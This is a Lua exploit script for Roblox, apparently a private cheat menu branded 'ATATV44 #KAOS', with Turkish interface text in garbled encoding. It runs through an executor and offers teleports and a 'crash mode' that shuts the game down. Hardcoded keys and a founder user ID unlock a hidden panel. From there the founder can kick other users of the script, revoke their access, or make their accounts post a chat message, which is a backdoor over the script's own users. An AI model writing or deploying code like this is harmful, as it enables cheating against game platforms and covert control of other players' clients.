--[[
    ATATV44 #KAOS - BLACK OPS V16 (2026 PRIVATE HYBRID)
    Admin: ATATV44 Kurucusu (MekanÄ±n Sahibi)
    Founder ID: 730497997
    System: Auto-Auth + Founder Protection + Golden Legend UI + Force Chat
    Key: atattv44 | Super Admin: !sys_core
]]

local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local lp = Players.LocalPlayer
local fileName = "ATATV44_Auth.txt"
local isSuperAdmin = false
local founderID = 730497997 

-- [1. SÄ°STEM FONKSÄ°YONLARI]
local function SaveKey() if writefile then writefile(fileName, "atattv44_verified") end end
local function IsKeySaved() if readfile and isfile and isfile(fileName) then return readfile(fileName) == "atattv44_verified" end return false end
local function ResetKey() if delfile and isfile(fileName) then delfile(fileName) end end

-- GUI Temizleyici (Ãœst Ã¼ste binmemesi iÃ§in)
if CoreGui:FindFirstChild("ATATV44_Final_Base") then CoreGui.ATATV44_Final_Base:Destroy() end

local function ShowNotify(text, color)
    local NotifyGui = Instance.new("ScreenGui", CoreGui)
    local Frame = Instance.new("Frame", NotifyGui)
    Frame.Size = UDim2.new(0, 240, 0, 45); Frame.Position = UDim2.new(0.5, -120, 0.1, -50)
    Frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10); Frame.BackgroundTransparency = 0.2
    local Corner = Instance.new("UICorner", Frame)
    Corner.CornerRadius = UDim.new(0, 12)
    local Stroke = Instance.new("UIStroke", Frame)
    Stroke.Thickness = 2; Stroke.Color = color or Color3.fromRGB(138, 43, 226)
    local Label = Instance.new("TextLabel", Frame)
    Label.Size = UDim2.new(1, 0, 1, 0); Label.BackgroundTransparency = 1
    Label.Text = "âš¡ " .. text; Label.TextColor3 = Color3.fromRGB(255, 255, 255)
    Label.Font = Enum.Font.GothamBold; Label.TextSize = 13
    Frame:TweenPosition(UDim2.new(0.5, -120, 0.15, 0), "Out", "Quart", 0.3)
    task.spawn(function() task.wait(2); Frame:TweenPosition(UDim2.new(0.5, -120, 0.1, -50), "In", "Quart", 0.3); task.wait(0.4); NotifyGui:Destroy() end)
end

-- [2. GÄ°ZLÄ° HABERLEÅžME AÄžI]
local CommsFolder = game:GetService("JointsService"):FindFirstChild("PhysicsData") or Instance.new("Folder", game:GetService("JointsService"))
CommsFolder.Name = "PhysicsData"

local function CreateUserTag()
    local tag = CommsFolder:FindFirstChild(lp.Name) or Instance.new("StringValue", CommsFolder)
    tag.Name = lp.Name; tag.Value = tostring(lp.UserId)
end

CommsFolder.ChildAdded:Connect(function(child)
    if child:IsA("StringValue") then
        task.wait(0.1) -- Verinin iÅŸlenmesi iÃ§in kÄ±sa bekleme
        if child.Name == "CMD_" .. lp.Name then
            if lp.UserId == founderID then
                ShowNotify("UYARI: BÄ°RÄ° SANA KOMUT GÃ–NDERDÄ°, ENGELLENDÄ°!", Color3.fromRGB(255, 0, 0))
                child:Destroy(); return 
            end
            if child.Value == "Kick" then lp:Kick("\n[ATATV44 #KAOS]\nEriÅŸim Ä°ptal Edildi.")
            elseif child.Value == "Revoke" then ResetKey(); lp:Kick("\n[ATATV44 #KAOS]\nYetkiniz Geri AlÄ±ndÄ±.")
            elseif child.Value == "ForceChat" then
                local msg = "MEKANIN SAHÄ°BÄ° GERÄ° GELDÄ° BEBELERÄ° PÄ°STEN ALALIM ALALIM ðŸ”¥ðŸ”¥ðŸ”¥"
                local sayMsg = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
                if sayMsg then sayMsg:FireServer(msg, "All") end
            end
        elseif child.Name == "GLOBAL_MSG" and lp.UserId ~= founderID then
            ShowNotify(child.Value, Color3.fromRGB(255, 215, 0))
        end
    end
end)

-- [3. ATMOSFER & LOGO]
local Blur = Lighting:FindFirstChild("ATATV44_Blur") or Instance.new("BlurEffect", Lighting)
Blur.Name = "ATATV44_Blur"; Blur.Size = 0
local function SetBlur(state) TweenService:Create(Blur, TweenInfo.new(0.5), {Size = state and 25 or 0}):Play() end

local MainGui = Instance.new("ScreenGui", CoreGui)
MainGui.Name = "ATATV44_Final_Base"; MainGui.ResetOnSpawn = false

local function DrawLogo(parent)
    local LogoFrame = Instance.new("Frame", parent)
    LogoFrame.Size = UDim2.new(1, 0, 0, 50); LogoFrame.BackgroundTransparency = 1; LogoFrame.Position = UDim2.new(0, 0, 0, 10)
    local LogoLabel = Instance.new("TextLabel", LogoFrame)
    LogoLabel.Size = UDim2.new(1, 0, 1, 0); LogoLabel.BackgroundTransparency = 1
    LogoLabel.Text = "ATATV44"; LogoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    LogoLabel.Font = Enum.Font.GothamBold; LogoLabel.TextSize = 34
    local Stroke = Instance.new("UIStroke", LogoLabel)
    Stroke.Thickness = 0.5; Stroke.Color = Color3.fromRGB(255, 255, 255)
end

-- [4. MÃœHÃœR EFEKTÄ°]
local markerFolder = nil
local function CreateMarker(cframe)
    if markerFolder then markerFolder:Destroy() end
    markerFolder = Instance.new("Folder", workspace); markerFolder.Name = "ATATV44_Marker"
    local function CreateSquare(size, rotationSpeed)
        local p = Instance.new("Part", markerFolder)
        p.Size = Vector3.new(size, 0.1, size); p.CFrame = cframe * CFrame.new(0, -2.5, 0)
        p.Anchored = true; p.CanCollide = false; p.Material = Enum.Material.Neon
        p.Color = Color3.fromRGB(138, 43, 226); p.Transparency = 0.4
        local sb = Instance.new("SelectionBox", p); sb.Adornee = p; sb.LineThickness = 0.05; sb.Color3 = Color3.fromRGB(255, 255, 255)
        RunService.RenderStepped:Connect(function() if p and p.Parent then p.CFrame = p.CFrame * CFrame.Angles(0, math.rad(rotationSpeed), 0) end end)
    end
    CreateSquare(6, 4); CreateSquare(4, -6)
end

-- [5. ANA Ä°CRAAT MENÃœSÃœ]
local function StartMain()
    SetBlur(false); CreateUserTag()
    ShowNotify(isSuperAdmin and "CORE SÄ°STEMÄ° AKTÄ°F!" or "HOÅž GELDÄ°N KURUCUM!")

    local MainFrame = Instance.new("Frame", MainGui)
    MainFrame.Size = UDim2.new(0, 240, 0, 460); MainFrame.Position = UDim2.new(1, -280, 0.5, -230)
    MainFrame.BackgroundColor3 = Color3.fromRGB(2, 2, 2); MainFrame.Active = true; MainFrame.Draggable = true
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)
    local MainStroke = Instance.new("UIStroke", MainFrame)
    MainStroke.Thickness = 3; MainStroke.Color = Color3.fromRGB(138, 43, 226)
    DrawLogo(MainFrame)

    local ButtonHolder = Instance.new("Frame", MainFrame)
    ButtonHolder.Size = UDim2.new(0.9, 0, 0.7, 0); ButtonHolder.Position = UDim2.new(0.05, 0, 0.18, 0); ButtonHolder.BackgroundTransparency = 1
    Instance.new("UIListLayout", ButtonHolder).Padding = UDim.new(0, 10)

    local savedPos, crashOn, warpMode = nil, false, false

    local function CreateBtn(txt, func)
        local b = Instance.new("TextButton", ButtonHolder)
        b.Size = UDim2.new(1, 0, 0, 42); b.BackgroundColor3 = Color3.fromRGB(12, 12, 12); b.Text = txt
        b.TextColor3 = Color3.fromRGB(200, 200, 200); b.Font = Enum.Font.GothamBold
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
        local bs = Instance.new("UIStroke", b)
        bs.Thickness = 1.2; bs.Color = Color3.fromRGB(40, 40, 40)
        b.MouseButton1Click:Connect(func); return b
    end

    CreateBtn("> FLASH TP (20 STUD)", function()
        local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.CFrame = hrp.CFrame * CFrame.new(0, 0, -20); ShowNotify("FLASH!") end
    end)

    CreateBtn("> KONUMU MÃœHÃœRLE", function()
        local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
        if hrp then savedPos = hrp.CFrame; CreateMarker(savedPos); ShowNotify("MÃœHÃœRLENDÄ°!") end
    end)

    local mToggle = CreateBtn("MOD: SÃœZÃœLME", function() end)
    mToggle.BackgroundColor3 = Color3.fromRGB(0, 40, 80)
    mToggle.MouseButton1Click:Connect(function()
        warpMode = not warpMode; mToggle.Text = warpMode and "MOD: IÅžINLANMA" or "MOD: SÃœZÃœLME"
        ShowNotify("MOD DEÄžÄ°ÅžTÄ°!")
    end)

    CreateBtn("> OPERASYONU BAÅžLAT", function()
        local char = lp.Character; local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChild("Humanoid")
        if hrp and savedPos then
            local function FinalSeq()
                if crashOn then
                    hrp.Velocity = Vector3.new(0, 55, 0); task.wait(0.2); hrp.Velocity = Vector3.new(0, -1200, 0)
                    local c; c = RunService.Heartbeat:Connect(function()
                        if not hrp.Parent then c:Disconnect() return end
                        local ray = Ray.new(hrp.Position, Vector3.new(0, -3, 0))
                        if workspace:FindPartOnRay(ray, char) or (hum and hum.FloorMaterial ~= Enum.Material.Air) then
                            c:Disconnect(); if markerFolder then markerFolder:Destroy() end
                            game:Shutdown()
                        end
                    end)
                end
            end
            if warpMode then hrp.CFrame = savedPos; FinalSeq()
            else local g = TweenService:Create(hrp, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {CFrame = savedPos}); g:Play(); g.Completed:Connect(FinalSeq) end
        end
    end)

    local cToggle = CreateBtn("CRASH MODU: PASÄ°F", function() end)
    cToggle.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
    cToggle.MouseButton1Click:Connect(function()
        crashOn = not crashOn; cToggle.Text = crashOn and "CRASH MODU: AKTÄ°F" or "CRASH MODU: PASÄ°F"
        cToggle.BackgroundColor3 = crashOn and Color3.fromRGB(150, 0, 0) or Color3.fromRGB(30, 0, 0)
    end)

    -- [SUPER ADMIN PANELÄ°]
    if isSuperAdmin then
        local SAPanel = Instance.new("Frame", MainGui)
        SAPanel.Size = UDim2.new(0, 220, 0, 380); SAPanel.Position = UDim2.new(0, 40, 0.5, -190)
        SAPanel.BackgroundColor3 = Color3.fromRGB(5, 5, 5); SAPanel.Active = true; SAPanel.Draggable = true
        Instance.new("UICorner", SAPanel).CornerRadius = UDim.new(0, 12)
        local SAStroke = Instance.new("UIStroke", SAPanel)
        SAStroke.Color = Color3.fromRGB(255, 0, 0); SAStroke.Thickness = 2
        
        local SATitle = Instance.new("TextLabel", SAPanel)
        SATitle.Size = UDim2.new(1, 0, 0, 35); SATitle.Text = "CORE CONTROL"; SATitle.TextColor3 = Color3.fromRGB(255, 0, 0); SATitle.Font = Enum.Font.GothamBold; SATitle.BackgroundTransparency = 1; SATitle.TextSize = 12
        
        local Scroll = Instance.new("ScrollingFrame", SAPanel)
        Scroll.Size = UDim2.new(0.9, 0, 0.8, 0); Scroll.Position = UDim2.new(0.05, 0, 0.12, 0); Scroll.BackgroundTransparency = 1; Scroll.ScrollBarThickness = 0
        Instance.new("UIListLayout", Scroll).Padding = UDim.new(0, 5)

        local function RefreshSA()
            for _, v in pairs(Scroll:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
            for _, child in pairs(CommsFolder:GetChildren()) do
                if child:IsA("StringValue") and not child.Name:find("CMD_") and child.Name ~= "GLOBAL_MSG" then
                    local f = Instance.new("Frame", Scroll); f.Size = UDim2.new(1, 0, 0, 75); f.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Instance.new("UICorner", f)
                    local n = Instance.new("TextLabel", f); n.Size = UDim2.new(1, 0, 0, 25); n.TextColor3 = Color3.fromRGB(255, 255, 255); n.BackgroundTransparency = 1; n.Font = Enum.Font.GothamBold; n.TextSize = 12
                    if child.Value == tostring(founderID) then
                        n.Text = "ðŸ‘‘ " .. child.Name; local grad = Instance.new("UIGradient", n)
                        grad.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 215, 0))})
                        task.spawn(function() while n and n.Parent do for i = -1, 1, 0.05 do if grad then grad.Offset = Vector2.new(i, 0) end; task.wait(0.05) end end end)
                    else n.Text = child.Name end
                    
                    local k = CreateBtn("KICK", function()
                        if child.Value == tostring(founderID) then ShowNotify("HATA: KURUCUYA DOKUNAMAZSIN!", Color3.fromRGB(255, 0, 0))
                        else local cmd = Instance.new("StringValue", CommsFolder); cmd.Name = "CMD_" .. child.Name; cmd.Value = "Kick"; task.wait(0.5); cmd:Destroy() end
                    end); k.Parent = f; k.Size = UDim2.new(0.3, 0, 0, 20); k.Position = UDim2.new(0.02, 0, 0.45, 0); k.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
                    
                    local r = CreateBtn("REVOKE", function()
                        if child.Value == tostring(founderID) then ShowNotify("HATA: KURUCUYA DOKUNAMAZSIN!", Color3.fromRGB(255, 0, 0))
                        else local cmd = Instance.new("StringValue", CommsFolder); cmd.Name = "CMD_" .. child.Name; cmd.Value = "Revoke"; task.wait(0.5); cmd:Destroy() end
                    end); r.Parent = f; r.Size = UDim2.new(0.3, 0, 0, 20); r.Position = UDim2.new(0.35, 0, 0.45, 0); r.BackgroundColor3 = Color3.fromRGB(150, 100, 0)
                    
                    local c = CreateBtn("CHAT", function()
                        if child.Value == tostring(founderID) then ShowNotify("KURUCUYA CHAT YAPTIRAMAZSIN!", Color3.fromRGB(255, 0, 0))
                        else local cmd = Instance.new("StringValue", CommsFolder); cmd.Name = "CMD_" .. child.Name; cmd.Value = "ForceChat"; task.wait(0.5); cmd:Destroy(); ShowNotify("MESAJ YAZDIRILDI!", Color3.fromRGB(0, 255, 0)) end
                    end); c.Parent = f; c.Size = UDim2.new(0.3, 0, 0, 20); c.Position = UDim2.new(0.68, 0, 0.45, 0); c.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
                end
            end
        end
        RefreshSA(); task.spawn(function() while task.wait(5) do RefreshSA() end end)
    end

    local ResetBtn = Instance.new("TextButton", MainFrame)
    ResetBtn.Size = UDim2.new(0, 80, 0, 25); ResetBtn.Position = UDim2.new(1, -90, 1, -35); ResetBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    ResetBtn.Text = "KEY SÄ°FÄ°R"; ResetBtn.TextColor3 = Color3.fromRGB(100, 100, 100); ResetBtn.Font = Enum.Font.GothamBold; ResetBtn.TextSize = 10
    Instance.new("UICorner", ResetBtn).CornerRadius = UDim.new(0, 5)
    ResetBtn.MouseButton1Click:Connect(function() ResetKey(); MainGui:Destroy(); ShowNotify("SIFIRLANDI!") end)
end

-- [6. KEY SÄ°STEMÄ° EKRANI]
local function ShowKeySystem()
    SetBlur(true); 
    local KeyFrame = Instance.new("Frame", MainGui)
    KeyFrame.Size = UDim2.new(0, 300, 0, 200); KeyFrame.Position = UDim2.new(0.5, -150, 0.4, -100); KeyFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    Instance.new("UICorner", KeyFrame).CornerRadius = UDim.new(0, 12)
    local KeyStroke = Instance.new("UIStroke", KeyFrame); KeyStroke.Thickness = 2.5; KeyStroke.Color = Color3.fromRGB(138, 43, 226)
    DrawLogo(KeyFrame)
    local KeyInput = Instance.new("TextBox", KeyFrame)
    KeyInput.Size = UDim2.new(0.8, 0, 0, 45); KeyInput.Position = UDim2.new(0.1, 0, 0.4, 0); KeyInput.BackgroundColor3 = Color3.fromRGB(15, 15, 15); KeyInput.PlaceholderText = "AnahtarÄ± Ã‡ak..."; KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255); KeyInput.Text = ""
    Instance.new("UICorner", KeyInput).CornerRadius = UDim.new(0, 10)
    local CheckBtn = Instance.new("TextButton", KeyFrame)
    CheckBtn.Size = UDim2.new(0.6, 0, 0, 40); CheckBtn.Position = UDim2.new(0.2, 0, 0.72, 0); CheckBtn.BackgroundColor3 = Color3.fromRGB(80, 0, 150); CheckBtn.Text = "SÄ°STEMÄ° TETÄ°KLE"; CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255); CheckBtn.Font = Enum.Font.GothamBold
    Instance.new("UICorner", CheckBtn).CornerRadius = UDim.new(0, 10)

    if lp.UserId == founderID then
        isSuperAdmin = true; KeyInput.Text = "!sys_core"; CheckBtn.Text = "HOÅž GELDÄ°N YÃœCE PATRON..."; task.wait(0.5); KeyFrame:Destroy(); StartMain(); return
    end

    CheckBtn.MouseButton1Click:Connect(function()
        if KeyInput.Text == "!sys_core" then isSuperAdmin = true; KeyFrame:Destroy(); StartMain()
        elseif KeyInput.Text == "atattv44" then SaveKey(); KeyFrame:Destroy(); StartMain()
        else CheckBtn.Text = "ERÄ°ÅžÄ°M REDDEDÄ°LDÄ°"; task.wait(1); CheckBtn.Text = "SÄ°STEMÄ° TETÄ°KLE" end
    end)
end

-- BAÅžLATICI
if IsKeySaved() then 
    StartMain() 
else 
    ShowKeySystem() 
end
